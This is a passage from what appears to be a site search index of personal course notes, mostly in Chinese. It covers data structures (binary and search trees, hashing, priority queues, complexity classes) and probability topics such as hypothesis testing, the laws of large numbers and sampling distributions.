case that involves no recursion, is that of an empty binary tree. The empty tree will usually be the base case for recursive algorithms and will determine when the algorithm stops. One node tree: The only way to construct a binary tree with one node is to make that node into the root and to make both the left and right subtrees empty. Thus a single node with no branches is the one and only binary tree with one node. Tree node tree: With two nodes in the tree, one of them will be the root and the other will be in a subtree.  Traversal #  If we name the tasks of visiting a node V, traversing the left subtree L, and traversing the right subtree R, then there are six ways to arrange them:\nstandard traversal orders #   VLR → preorder LVR → inorder(symmetric oder) LRV → postorder (endorder)  Expression Trees #   An expression tree is built up from the simple operands and operators of an (arithmetical or logical) expression by placing the simple operands as the leaves of a binary tree and the operators as the interior nodes.\n   For each binary operator, the left subtree contains all the simple operands and operators in the left operand of the given operator, and the right subtree contains everything in the right operand.\n  For a unary operator, one of the two subtrees will be empty.\n  The names of the traversal methods are related to the Polish forms of the expressions:\n preorder traversal yields the prefix form, in which every operator is written before its operand(s); inorder traversal gives the infix form (the customary way to write the expression); postorder traversal gives the postfix form, in which all operators appear after their operand(s).  Linked Implementation #  Basic method #   empty constructor → set root pointer as NULL. (check empty). visit a node. Recursive traversal.  Binary search trees #  Defination #   A binary search tree is a binary tree that is either empty or in which every node has a key (within its data entry) and satisfies the following conditions:\n The key of the root (if it exists) is greater than the key in any node in the left subtree of the root. The key of the root (if it exists) is less than the key in any node in the right subtree of the root. The left and right subtrees of the root are again binary search trees.   Tree Search #  Strategy:\n To search for the target, we first compare it with the entry at the root of the tree. If their keys match, then we are finished. Otherwise, we go to the left subtree or right subtree as appropriate and repeat the search in that subtree.  Insertion #  Treesort #  defination #   We simply take the entries to be sorted, use the method insert to build them into a binary search tree, and use inorder traversal to put them out in order.\n comparison with quick-sort #  Treesort makes exactly the same comparisons of keys as does quicksort when the pivot for each sublist is chosen to be the first key in the sublist.\nRemoval #    case 1: deletion of a leaf.\n  case 2: one subtree empty.\n  case 3: none subtree empty.\n  Building a binary search tree #  "},{"id":173,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/dictionary/","title":"Dictionary","section":"数据结构","content":"字典 #  ADT 抽象数据类型 #  ADT dictionary\r{\rDATA:\rdata_pair key_value[];\rMETHOD:\rempty(): return true if key_value is empty.\rsize(): return size of key_value.\rfind(k): return pointer in key_value whose key is k.\rinsert(p): insert data_pair p into key_value.\rerase(k): erase data_pair from key_value where its key is k.\r}\r线性表表示 #  两个类 sortedArrayList 和 sortedChain 分别存储键和值。\n跳表表示 #  跳跃表（skiplist）是一种随机化的数据， 由 William Pugh 在论文《Skip lists: a probabilistic alternative to balanced trees》中提出， 跳跃表以有序的方式在层次化的链表中保存元素， 效率和平衡树媲美 —— 查找、删除、添加等操作都可以在对数期望时间下完成， 并且比起平衡树来说， 跳跃表的实现要简单直观得多。\n散列表示 #  散列函数为 f，数对 p 的关键字如果是 k，那么它在散列表中的位置就是 f(k)。\n性能分析：设 b 为散列表的桶数，n 为散列表中的记录个数，令 $$U_n$$ 和 $$S_n$$ 分别表示在一个成功搜索和不成功搜索中平均搜索的桶数，则：\n $${\\displaystyle U_n = \\frac{1}{2} (1 + \\frac{1}{(1 - \\alpha)^2})}$$ $$\\displaystyle S_n = \\frac{1}{2} (1 + \\frac{1}{(1 - \\alpha)})$$  其中 $$\\displaystyle \\alpha = \\frac{n}{b}$$ 称为负载因子 (loading factor)。\nLZW 压缩法 #  （懒得写了）\n"},{"id":174,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/priorityqueue/","title":"Priority Queue","section":"数据结构","content":"优先级队列 #  ADT 抽象数据类型 #  ADT maxPriorityQueue\r{\rDATA:\relement ele_queue[];\rMETHOD:\rempty():\treturn true if ele_queue is empty.\rsize():\treturn size of ele_queue.\rtop(): return the element with max priority.\rpop():\tdelete the element with max priority.\rpush(x):\tpush element \u0026quot;x\u0026quot;.\r}\r堆 #  概念：大根堆，小根堆。\n左高树 #  概念：\n  外部结点（external node）：加入在树中所有空子树的结点。\n  内部结点（internal node）：原本就存在的结点。\n  扩充二叉树（extended binary tree）：增加了外部节点的二叉树。\n  令 s(x) 是从结点 x 到其子树的外部节点的所有路径中最短的一条，则：\n  高度优先左高树（height-based leftist tree, HBLT）：其内部结点的左孩子的 s 值都大于或等于右孩子的 s 值。\n  最大 HBLT：同时为大根树和 HBLT 的二叉树。\n  令 w(x) 是以结点 x 为根的子树的内部结点数目：\n 重量优先左高树（weight-biased leftist tree, WBLT）：其内部结点的左孩子的 w 值都大于或等于右孩子的 w 值。 最大 WBLT：同时为大根树和 WBLT 的二叉树。  C++ #  C++ 的 STL 库中由 prioryty_queue 这个类可以实现优先级队列。\n"},{"id":175,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/review/","title":"Review","section":"数据结构","content":"REVIEW #  1. 基本知识 #  维基百科上列出了下面的时间复杂度种类：\n   名称 运行时间（$${\\displaystyle T(n)}$$） 算法举例     常数时间 $${\\displaystyle O(1)}$$ 判断一个二进制数的奇偶   反阿克曼时间 $${\\displaystyle O(\\alpha (n))}$$ 并查集的单个操作的平摊时间   迭代对数时间 $${\\displaystyle O(\\log ^{*}n)}$$ 分布式圆环着色问题   对数对数时间 $${\\displaystyle O(\\log \\log n)}$$ 有界优先队列的单个操作   对数时间 $${\\displaystyle O(\\log n)}$$ 二分搜索   幂对数时间 $${\\displaystyle (\\log n)^{O(1)}}$$    （小于1次）幂时间 $${\\displaystyle O(n^{c})}$$，其中$${\\displaystyle 0\u0026lt;c\u0026lt;1}$$ K-d 树的搜索操作   线性时间 $${\\displaystyle O(n)}$$ 无序数组的搜索   线性迭代对数时间 $${\\displaystyle O(n\\log ^{*}n)}$$ 莱姆德·赛德尔的三角分割多边形算法   线性对数时间 $${\\displaystyle O(n\\log n)}$$ 最快的比较排序   二次时间 $${\\displaystyle O(n^{2})}$$ 冒泡排序、插入排序   三次时间 $${\\displaystyle O(n^{3})}$$ 矩阵乘法的基本实现，计算部分相关性   多项式时间 $${\\displaystyle 2^{O(\\log n)}=n^{O(1)}}$$ 线性规划中的卡马卡算法，AKS 质数测试   准多项式时间 $${\\displaystyle 2^{(\\log n)^{O(1)}}}$$ 关于有向斯坦纳树问题最著名的$${\\displaystyle O(\\log ^{2}n)}!O(\\log ^{2}n)$$近似算法   次指数时间（第一定义） $${\\displaystyle O(2^{n^{\\epsilon }})}$$对任意的$$\\epsilon \u0026gt; 0​$$ 假设复杂性理论推测。   次指数时间（第二定义） $$2^{o(n)}$$ 用于整数分解与图形同构问题的著名算法   指数时间 $$2^{O(n)}$$ 使用动态规划解决旅行推销员问题   阶乘时间 $$O(n!)$$ 通过暴力搜索解决旅行推销员问题   指数时间 $$2^{poly(n)}$$    双重指数时间 $$2^{2poly(n)}$$ 在预膨胀算术中决定一个给定描述的真实性    2. 表结构 #  3. 树结构 #  概念：\n  树的高度或深度：从树的根节点开始到所有叶子结点中，最长路径中的结点个数；\n  度：\n 树中一个元素的度是指其孩子的个数； 树本身的度是指其中所有元素度的最大值。    满二叉树：高度为 h，含有 $$2^h - 1$$ 个元素的二叉树。\n  完全二叉树：顺序编号后，$$1 \\le i \\le n$$ 的结点 i 存在结点，$$n \\lt i \\le 2^h - 1$$ 的结点 i 均为空的二叉树。\n  4. 图结构 #  概念：\n顶点、边、无向边、有向边、关联于、关联至、邻接于、邻接至、无向图、有向图、完全图、稀疏图、稠密图、带权图、子图、顶点的度、入度、出度、路径、路径长度、简单路径、回路、连通图、连通分量、强连通图、强连通分量、生成树、生成森林。\n"},{"id":176,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/searchtree/","title":"Search Tree","section":"数据结构","content":"搜索树 #  二叉搜索树 BST #  满足以下特性的二叉树是棵二叉搜索树（Binary Search Tree）：\n 每个元素有一个关键字，并且任意两个元素的关键字都不同；因此所有关键字都是唯一的； 在根节点的左子树中，元素的关键字（如果有的话）都小于根节点的关键字； 在根节点的右子树中，元素的关键字（如果有的话）都大于根节点的关键字； 根节点的左右子树也都是二叉搜索树。  AVL 搜索树 #  AVL 树是 Adelson-Velskii 和 Landis 在 1962 年提出的：\n AVL 搜索树是一棵二叉搜索树 左右子树的高分别为 $$h_L, h_R$$，则 AVL 搜索树有：$$|h_L - h_R| \\le 1$$ AVL 搜索树根节点的左子树和右子树也是 AVL 搜索树。  红黑树 #  红黑树：\n 红黑树是一个带有颜色的二叉查找树，所有结点均是红色或黑色； 根是黑色； 所有叶子都是黑色（叶子结点是外部结点）； 每个红色结点必须有两个黑色结点； 从任一节点到其每个叶子的简单路径都包含相同数量的黑色结点。  B-树 #  根据 Knuth 的定义，一个 m 阶的B树是一个有以下属性的树：\n 每个节点最多有 m 个子节点； 每个非叶子节点（除根节点）最少有 $$\\displaystyle [\\frac{m}{2}] $$ 个子节点； 如果根节点不是叶子节点，那么它至少有两个子节点； 有 k 个子节点的非叶子节点拥有 k − 1 个键； 所有的叶子节点都在同一层。  "},{"id":177,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%A6%82%E7%8E%87%E8%AE%BA/%E5%81%87%E8%AE%BE%E6%A3%80%E9%AA%8C/","title":"假设检验","section":"概率论","content":"假设检验 #  概念 #  原假设和备选假设 #  原假设（null hypothesis）：$$H_0$$\n 原来就有的假设 经过长期证明是对的  对立假设 /备择假设（alternative hypothesis）：$$ H_1 $$\n参数的假设一般具有如下三种形式：\n   原假设 $$H_0$$ 备选假设 $$H_1$$ 记作 分类     $$\\theta = \\theta_0$$ $$\\theta \\ne \\theta_0$$ $$H_0(I)$$ 双侧检验   $$\\theta \\ge \\theta_0$$ $$\\theta \\lt \\theta_0$$ $$H_0(II)$$ 单侧检验   $$\\theta \\le \\theta_0$$ $$\\theta \\gt \\theta_0$$ $$H_0(III)$$ 单侧检验    假设检验：就是通过样本来回答原假设是正确还是错误。\n检验统计量 #  检验统计量的取值范围和变化情况，能包含和反映 $$ H_0 $$ 与$$ H_1 $$ 所描述的内容，并且当 $$ H_0 $$ 成立时，能够确定检验统计量的概率分布。\n检验统计量的基本形式例如：$${\\displaystyle z = \\frac{\\overline{x} - \\mu_0}{ \\sigma/\\sqrt{n} }}$$\n显著性水平 #    原假设 $$H_0$$ 正确，而被我们拒绝，犯这种错误的概率用 $$\\alpha$$ 表示。把 $$\\alpha$$ 称为假设检验中的显著性水平（Significant level），即决策中的风险。\n  显著性水平就是指当原假设正确时却把它拒绝的概率或风险。\n  通常取 $$\\alpha＝0.05$$ 或 $$ \\alpha =0.01$$ 或 $$\\alpha=0.001$$，那么，接受原假设时正确的可能性（概率）为：95%，99%，99.9%。\n  步骤 #    提出原假设和备择假设\n  确定适当的检验统计量\n  规定显著性水平\n  计算检验统量的值\n  作出统计决策\n  正态分布总体均值的假设检验 #  1. 单个正态分布总体的均值检验 #  1.1 方差已知 $$\\rightarrow$$ Z 检验法 #   总体 $$X \\sim N(\\mu , \\sigma^2)$$，$$\\sigma$$ 已知，假设 $$H_0: \\mu = \\mu_0; H_1: \\mu \\ne \\mu_0$$\n 构造 U 统计量 $${\\displaystyle Z = \\frac{\\overline{X} - \\mu_0}{\\sigma/\\sqrt{n}} \\sim N(0,1)}$$\n由 $${\\displaystyle P\\Big(\\mid \\frac{\\overline{X} - \\mu_0}{\\sigma/\\sqrt{n}} \\mid \\ge u_{\\alpha/2}\\Big) = \\alpha}$$，确定拒绝域 $$|Z| \\ge u_{\\alpha/2}$$\n如果统计观察值 $$|Z| \\ge u_{\\alpha/2}$$，则拒绝原假设；否则接收原假设。\n1.2 方差未知 $$\\rightarrow$$ T 检验法 #   总体 $$X \\sim N(\\mu , \\sigma^2)$$，$$\\sigma$$ 未知，假设 $$H_0: \\mu = \\mu_0; H_1: \\mu \\ne \\mu_0$$\n 构造 T 统计量 $${\\displaystyle T = \\frac{\\overline{X} - \\mu_0}{S/\\sqrt{n}} \\sim t(n-1)}$$\n由 $${\\displaystyle P\\Big(\\mid \\frac{\\overline{X} - \\mu_0}{S/\\sqrt{n}} \\mid \\ge t_{\\alpha/2}(n-1)\\Big) = \\alpha}$$，确定拒绝域 $$|T| \\ge t_{\\alpha/2}(n-1)$$\n如果统计观察值 $$|T| \\ge t_{\\alpha/2}$$，则拒绝原假设；否则接收原假设。\n2. 两个正态分布总体的均值检验 #  2.1 方差已知，检验均值相等 $$\\rightarrow$$ Z 双侧检验法 #   已知 $$X \\sim N(\\mu_X , \\sigma_X^2), Y \\sim N(\\mu_Y , \\sigma_Y^2)$$，已知 $$\\sigma_X^2, \\sigma_Y^2$$，检验 $$H_0: \\mu_X = \\mu_Y$$\n 设 $$X_1, X_2, \u0026hellip;, X_{n_1}$$ 是 X 的一个样本，$$Y_1, Y_2, \u0026hellip;, Y_{n_2}$$ 是 Y 的一个样本，\n则当 $$H_0$$ 成立时有：$$\\displaystyle Z = \\frac{\\overline{X} - \\overline{Y}}{\\sqrt{\\sigma_X^2/n_1 + \\sigma_Y^2/n_2}} \\sim N(0,1)$$，\n故对给定的检验水平 $$\\alpha$$，得 $$H_0$$ 的拒绝域为：$$\\displaystyle \\Bigg| \\frac{\\overline{X} - \\overline{Y}}{\\sqrt{\\sigma_X^2/n_1 + \\sigma_Y^2/n_2}} \\Bigg| \u0026gt; z_{\\alpha/2}$$\n2.2 方差未知，但两个总体方差相等，检验均值相等 #   已知 $$X \\sim N(\\mu_X , \\sigma_X^2), Y \\sim N(\\mu_Y , \\sigma_Y^2)$$，$$\\sigma_X^2, \\sigma_Y^2$$未知，已知 $$\\sigma_X^2 = \\sigma_Y^2$$，检验 $$H_0: \\mu_X = \\mu_Y$$\n 设 $$X_1, X_2, \u0026hellip;, X_{n_1}$$ 是 X 的一个样本，$$Y_1, Y_2, \u0026hellip;, Y_{n_2}$$ 是 Y 的一个样本，\n则当 $$H_0$$ 成立时有：$$\\displaystyle T = \\frac{\\overline{X} - \\overline{Y} - (\\mu_X - \\mu_Y)}{\\sqrt{\\displaystyle \\frac{S_X^2(n_1-1) + S_Y^2(n_2 - 1)}{n_1 + n_2 - 2}} \\sqrt{\\displaystyle \\frac{1}{n_1} + \\frac{1}{n_2}}} \\sim t(n_1 + n_2 -2)$$，\n故对给定的检验水平 $$\\alpha$$，得 $$H_0$$ 的拒绝域为：$$\\displaystyle \\Bigg| \\frac{\\overline{X} - \\overline{Y} - (\\mu_X - \\mu_Y)}{\\sqrt{\\displaystyle \\frac{S_X^2(n_1-1) + S_Y^2(n_2 - 1)}{n_1 + n_2 - 2}} \\sqrt{\\displaystyle \\frac{1}{n_1} + \\frac{1}{n_2}}} \\Bigg| \u0026gt; t_{\\alpha/2}(n_1 + n_2 -2)$$\n正态分布总体方差的假设检验 #  1. 单个正态分布的方差检验 #  1.1 均值已知 #   总体 $$X \\sim N(\\mu , \\sigma^2)$$，$$\\mu$$ 已知，假设 $$H_0: \\sigma^2 = \\sigma^2_0; H_1: \\sigma^2 \\ne \\sigma^2_0$$\n 构造统计量 $$\\displaystyle \\chi^2 = \\frac{\\displaystyle \\sum_{i=1}^n(X_i - \\mu)^2}{\\sigma^2_0} \\sim \\chi^2(n)$$\n1.2 均值未知，双边检验 #   总体 $$X \\sim N(\\mu , \\sigma^2)$$，$$\\mu$$ 未知，假设 $$H_0: \\sigma^2 = \\sigma^2_0; H_1: \\sigma^2 \\ne \\sigma^2_0$$\n 构造统计量 $$\\displaystyle \\chi^2 = \\frac{(n-1)S^2}{\\sigma^2_0} \\sim \\chi^2(n-1)$$\n由 $$\\displaystyle P(\\chi^2 \\le \\chi^2_{1 - \\frac{\\alpha}{2}}(n-1)) = \\frac{\\alpha}{2}, \\displaystyle P(\\chi^2 \\le \\chi^2_{\\frac{\\alpha}{2}}(n-1)) = \\frac{\\alpha}{2}$$ 确定拒绝域 $$[0, \\chi^2_{1 - \\frac{\\alpha}{2}}(n-1)] \\cap [\\chi^2_{\\frac{\\alpha}{2}}(n-1), +\\infty]$$\n进行统计决策。\n1.3 均值未知，单边检验 #   总体 $$X \\sim N(\\mu , \\sigma^2)$$，$$\\mu$$ 未知，假设 $$H_0: \\sigma^2 \\le \\sigma^2_0; H_1: \\sigma^2 \\gt \\sigma^2_0$$\n 构造统计量 $$\\displaystyle \\chi^2 = \\frac{(n-1)S^2}{\\sigma^2_0} \\sim \\chi^2(n-1)$$\n通过 $$P(\\chi^2 \\ge \\chi^2_{\\alpha}) = \\alpha$$ 确定拒绝域 $$[\\chi^2_{\\alpha}, +\\infty)$$\n2. 两个正态分布的方差检验 #  2.1 均值未知，双边检验 #   已知 $$X \\sim N(\\mu_X , \\sigma_X^2), Y \\sim N(\\mu_Y , \\sigma_Y^2)$$，$$\\mu_X, \\mu_Y$$未知，检验 $$H_0: \\sigma^2_X = \\sigma^2_Y$$\n 若当 $$H_0$$ 成立时，则有 $$\\displaystyle F = \\frac{S_X^2}{S_Y^2} \\sim F(n_1 - 1, n_2 - 1)$$\n对于给定的检验水平 $$\\alpha $$，存在临界值 $$C_1$$ 和 $$C_2$$，使得：$$P(F \\le C_2 \\cup F \\ge C_1) = \\alpha$$，为了方便计算取：$$\\displaystyle P(F \\ge C_1) = P(F \\le C_2) = \\frac{\\alpha}{2}$$，\n于是可以确定拒绝域 $$\\displaystyle F \u0026lt; F_{1 - \\frac{\\alpha}{2}}(n_1 - 1, n_2 - 1) \\or F \u0026gt; F_{\\frac{\\alpha}{2}}(n_1 - 1, n_2 - 1)$$\n2.2 均值未知，方差单边检测 #   已知 $$X \\sim N(\\mu_X , \\sigma_X^2), Y \\sim N(\\mu_Y , \\sigma_Y^2)$$，$$\\mu_X, \\mu_Y$$未知，检验 $$H_0: \\sigma^2_X \\le \\sigma^2_Y$$\n 若当 $$H_0$$ 成立时，则有 $$\\displaystyle F = \\frac{S_X^2}{S_Y^2} \\sim F(n_1 - 1, n_2 - 1)$$\n拒绝域 $$F \u0026gt; F_{\\alpha}(n_1 -1, n_2 - 1)$$\n总结 #      参数 均值检测 方差检验     单个正态分布 已知 Z-检验：$$\\displaystyle \\frac{\\overline{X} - \\mu_0}{\\sigma/\\sqrt{n}} \\sim N(0,1)$$ $$\\chi^2$$-检验：$$\\displaystyle \\frac{\\displaystyle \\sum_{i=1}^n(X_i - \\mu)^2}{\\sigma^2_0} \\sim \\chi^2(n)$$    未知 T-检验：$${\\displaystyle \\frac{\\overline{X} - \\mu_0}{S/\\sqrt{n}} \\sim t(n-1)}$$ $$\\chi^2$$-检验：$$\\displaystyle \\frac{(n-1)S^2}{\\sigma^2_0} \\sim \\chi^2(n-1)$$   两个正态分布 已知 Z-检验：$$\\displaystyle \\frac{\\overline{X} - \\overline{Y}}{\\sqrt{\\sigma_X^2/n_1 + \\sigma_Y^2/n_2}} \\sim N(0,1)$$ 经过变换可以等价于未知且相等    未知 T-检验：$$\\displaystyle \\frac{U_w}{S_w} \\sim t(n_1 + n_2 -2)$$\n$$\\displaystyle U_w = \\frac{\\overline{X} - \\overline{Y} - (\\mu_X - \\mu_Y)}{\\sqrt{\\displaystyle \\frac{1}{n_1} + \\frac{1}{n_2}}}$$\n$$\\displaystyle S_w^2 = \\frac{S_X^2(n_1-1) + S_Y^2(n_2 - 1)}{n_1 + n_2 - 2}$$ F-检验：$$\\displaystyle \\frac{S_X^2}{S_Y^2} \\sim F(n_1 - 1, n_2 - 1)$$    "},{"id":178,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%A6%82%E7%8E%87%E8%AE%BA/%E5%88%87%E6%AF%94%E9%9B%AA%E5%A4%AB%E4%B8%8D%E7%AD%89%E5%BC%8F/","title":"切比雪夫不等式","section":"概率论","content":"知乎：https://www.zhihu.com/question/27821324\n马尔科夫不等式：\n $${\\displaystyle P(X \\ge a) \\le \\frac{E(X)}{a}, where\\ X \\ge a}$$  切比雪夫不等式：\n $${\\displaystyle P(|X-\\mu| \\ge k\\sigma) \\le \\frac{1}{k^2}}$$  前者带入 $$X \\Rightarrow |X-\\mu|$$ ，平方，令 $${\\displaystyle k = \\frac{a}{\\sigma}}$$ 得到后者。\n切比雪夫不等式预测的准确率要远远高于马尔科夫不等式。\n"},{"id":179,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%A6%82%E7%8E%87%E8%AE%BA/%E5%A4%A7%E6%95%B0%E5%AE%9A%E7%90%86%E5%92%8C%E4%B8%AD%E5%BF%83%E6%9E%81%E9%99%90%E5%AE%9A%E7%90%86/","title":"大数定理和中心极限定理","section":"概率论","content":"大数定理 #  依概率收敛 #  定义 #  如果对于任何 $$\\epsilon \u0026gt; 0$$，都有：\n$${\\displaystyle \\lim_{n \\to \\infin} P(|\\xi_n - \\xi| \\geq \\epsilon) = 0}$$\n那么我们称随机变量序列 $${\\displaystyle{ \\xi_n, n \\in \\mathbb{N}}}$$ 依概率收敛到随机变量 $$\\xi$$，记作 $${\\displaystyle \\xi_n \\xrightarrow{p} \\xi}$$\n性质 #  设 $$X_n \\xrightarrow{P} a, Y_n \\xrightarrow{P} b $$，且函数 $$g(x,y)$$ 在点 $$(a, b)$$ 连续，则称：$$g(X_n, Y_n) \\xrightarrow{P} g(a,b)$$\n依概率收敛比高等数学中的普通意义下的收敛弱些，它具有某种不确定性：\n 当 n 充分大时，事件 $$|X_n - a| \\lt \\epsilon$$ 的概率非常大，接近于 1，但是并不排除 $$|X_n - a| \\ge \\epsilon$$ 发生的可能性。  一、切比雪夫 Chebyshev 大数定理 #  设 $$X_1, X_2, \u0026hellip;, X_n, \u0026hellip;$$ 相互独立，且具有相同的数学期望和方差：$$E(X_k) = \\mu, D(X_k) = \\sigma^2, k = 1,2\u0026hellip;$$\n则：对前 n 个随机变量的算术平均有 $${\\displaystyle \\overline{X} = \\frac{1}{n} \\Sigma^{n}_{k=1} X_k \\xrightarrow{p} \\mu }$$\n含义：算术平均值依概率收敛意义下逼近某一常数\n二、伯努利 Bernoulli 大数定理 #  设 $$n_A$$ 是 n 次独立重复试验中事件 A 发生的次数，$$p$$ 是事件 A 在每次试验中发生的概率，\n则 $$\\displaystyle \\forall \\epsilon\u0026gt; 0, \\lim_{n \\rightarrow \\infty} P\\Big(\\mid \\frac{n_A}{n} - p \\mid \\lt \\epsilon\\Big) = 1$$\n重要意义：\n 从理论上证明了频率具有稳定性 提供了通过试验来确定事件概率的方法：$$\\displaystyle \\frac{n_A}{n} \\approx p = P(A)$$ 实际中概率很小的随机事件在个别试验中是不可能发生的。  三、辛钦 Wiener-khinchin 大数定理 #  设随机变量 $$X_1, X_2, \u0026hellip;, X_n, \u0026hellip;$$ 独立同分布，具有相同的数学期望 $$E(X_i) = \\mu, i = 1,2,\u0026hellip;$$，\n则：$$\\displaystyle \\forall \\epsilon \u0026gt; 0, \\lim_{n \\rightarrow \\infty} P(|\\frac{1}{n}\\sum_{i=1}^nX_i -\\mu| \u0026lt; \\epsilon) = 1$$\n中心极限定理 #  一、独立同分布下的中心极限定理 #  设随机变量 $$X_1, X_2, \u0026hellip;, X_n, \u0026hellip;$$ 相互独立，服从同一分布，且具有相同的数学期望和方差：$$E(X_k) = \\mu, D(X_k) = \\sigma_k^2, k \\in {1,2,\u0026hellip;}$$，\n则随机变量之和 $$\\displaystyle \\sum_{k=1}^{n} X_k$$ 的标准化变量 $$\\displaystyle Y_n = \\frac{\\displaystyle \\sum_{k=1}^{n} X_k - E(\\sum_{k=1}^n X_k)}{\\displaystyle \\sqrt{D(\\sum_{k=1}^n X_k)}} = \\frac{\\displaystyle \\sum_{k=1}^n X_k - n \\mu}{\\displaystyle \\sqrt{n}\\sigma}$$ 的分布函数 $$F_n(x) $$ 对于任意 x 满足：$$\\displaystyle \\lim_{n \\rightarrow \\infty} F_n(x) = \\phi(x)$$\n定理表明：\n  独立同分布随机变量之和 $$\\displaystyle \\sum_{k=1}^{n} X_k $$，当 n 充分大时，有 $$\\displaystyle \\sum_{k=1}^{n} X_k \\overset{similarly}{\\sim} N(n \\mu, n \\sigma^2)$$\n  一般情况下，我们很难求出 $$\\displaystyle \\sum_{k=1}^{n} X_k $$ 分布的确切形式，但当 n 很大时，可以求出近似分布。\n  无论随机变量序列服从何种分布，只要期望和方差有限，总和标准化后，以标准正态分布为极限。\n  二、李雅普诺夫 Lyapunov 定理 #  设随机变量 $$X_1, X_2, \u0026hellip;, X_n, \u0026hellip;$$ 相互独立，他们具有相同的数学期望和方差：$$E(X_k) = \\mu, D(X_k) = \\sigma_k^2, k \\in {1,2,\u0026hellip;}$$，记 $$\\displaystyle B_n^2 = \\sum_{k=1}^n \\sigma_k^2$$\n三、棣莫佛－拉普拉斯 De Moivre-Laplace 定理 #  设随机变量 $$\\eta_n$$ 服从参数为 $$n, p (0 \u0026lt; p \u0026lt; 1)$$ 的二项分布，则对于任意的 x，有：\n$$\\displaystyle \\lim_{n \\rightarrow \\infty} P(\\frac{\\eta_n - np}{\\sqrt{np(1-p)}} \\le x) = \\phi(x)$$\n定理表明：\n 当 n 很大时，变量 $$\\eta_n$$ 的分布，近似正态分布 $$N(np,np(1-p))$$  "},{"id":180,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%A6%82%E7%8E%87%E8%AE%BA/%E6%A0%B7%E6%9C%AC%E5%8F%8A%E6%8A%BD%E6%A0%B7%E5%88%86%E5%B8%83/","title":"样本及抽样分布","section":"概率论","content":"样本及抽样分布 #  总体与样本 #  样本：n 个与总体同分布的随机变量。\n简单随机样本：\n 代表性：样本中的每一个与所考查的总体有相同的分布； 独立性：样本中的每一个都是相互独立的随机变量。  统计量 #  定义：\n 设 $$X_1, X_2, \u0026hellip;, X_n$$ 是来自总体 X 的一个样本，$$g(X_1, X_2, \u0026hellip;, X_n)$$ 是 $$X_1, X_2, \u0026hellip;, X_n$$ 的函数，若 g 中不含任何参数，则 $$g(X_1, X_2, \u0026hellip;, X_n)$$ 称是一个统计量。  几个重要的统计量：\n 样本均值：$${\\displaystyle \\overline{X} = \\frac{1}{n}\\sum_{i=1}^n X_i }$$ 样本方差：$${\\displaystyle S^2 = \\frac{1}{n-1}\\sum_{i=1}^n (X_i - \\overline{X})^2 = \\frac{1}{n-1}\\Big(\\sum_{i=1}^nX_i^2 - n \\overline{X}^2\\Big)} $$  $${\\displaystyle E(S^2) = \\frac{1}{n-1}\\Big[\\sum_{i=1}^n(\\sigma^2 + \\mu^2) - n(\\frac{\\sigma^2}{n} + \\mu^2)\\Big] = \\sigma^2 }$$   样本 k 阶原点矩：$${\\displaystyle A_k = \\frac{1}{n}\\sum_{i=1}^n X_i^k }$$ 样本 k 阶中心矩：$${\\displaystyle B_k = \\frac{1}{n}\\sum_{i=1}^n (X_i - \\overline{X})^k }$$  经验分布函数 #  设 $$X_1, X_2, \u0026hellip;, X_n$$ 是总体 $$F$$ 的样本，用 $$s(x), |x| \u0026lt; \\infty$$ 表示 $$X_1, X_2, \u0026hellip;, X_n$$ 中不大于 $$x$$ 的随机变量的个数。\n定义经验分布函数为 $${\\displaystyle F_n(x) = \\frac{1}{n} s(x), -\\infty \u0026lt; x \u0026lt; +\\infty}$$\n抽样分布 #  统计量是样本的函数，它是一个随机变量，统计量的分布称为抽样分布。\n$\\chi^2$ 分布 #  定义：\n 设 $$X_1, X_2, \u0026hellip;, X_n$$ 相互独立，都服从正态分布 $$N(0,1)$$，则称随机变量：$$\\chi^2 = X_1^2 + X_2^2 + \u0026hellip; + X_n^2$$ 所服从的分布为自由度为 n 的 $$\\chi^2$$ 分布。记作 $$\\chi^2 \\sim \\chi^2(n)$$。  密度函数：\n$$\\displaystyle f(x) = \\begin{cases} {\\displaystyle \\frac{1}{2^{n/2}\\Gamma(n/2)} x^{\\frac{n}{2} - 1}e^{- \\frac{x}{2}} }\u0026amp;, x \\ge 0 \\ 0\u0026amp;, x \u0026lt; 0 \\end{cases}$$\n其中：$${\\displaystyle \\Gamma(x) = \\int_0^{\\infty} e^{-t} x^{x-1}dt, x \u0026lt; 0}$$\n性质：\n  设 $$X_1 \\sim \\chi^2(n_1), X_2 \\sim \\chi^2(n_2)$$，且 $$X_1, X_2$$ 相互独立，则有：$$X_1 + X_2 \\sim \\chi^2(n_1 + n_2)$$，这个性质叫 $$\\chi^2$$ 分布的可加性。\n  若 $$\\chi^2 \\sim \\chi^2(n)$$，则当 n 充分大时，$${\\displaystyle \\frac{X-n}{\\sqrt{2n}} \\sim N(0, 1)}$$\n  若 $$\\chi^2 \\sim \\chi^2(n)$$，则 $$E(X) = n, D(X) = 2n$$\n  $$\\chi^2$$ 分布的分位点：\n 对于给定的正数 $$\\alpha, 0 \u0026lt; \\alpha \u0026lt; 1$$，称满足条件 $$\\displaystyle P(\\chi^2 \u0026gt; \\chi^2_{\\alpha}(n)) = \\int_{\\chi^2_{\\alpha}(n)}^{\\infty} f(y) dy = \\alpha$$ 的点 $$\\chi^2_{\\alpha}(n)$$ 为 $$\\chi^2(n)$$ 分布上的 $$\\alpha$$ 分位点。  t 分布 #  定义：\n 设 $$X \\sim N(0,1), Y \\sim \\chi^2(n)$$，且 X 与 Y 相互独立，则称变量：$$\\displaystyle t = \\frac{X}{\\sqrt{Y/n}}$$ 所服从的分布为自由度为 n 的 t 分布。记为 $$t \\sim t(n)$$，t 分布又被称为学生氏分布。  概率密度函数：\n$${\\displaystyle h(t) = \\frac{\\Gamma[(n+1)/2]}{\\Gamma(n/2)\\sqrt{n \\pi}} (1 + 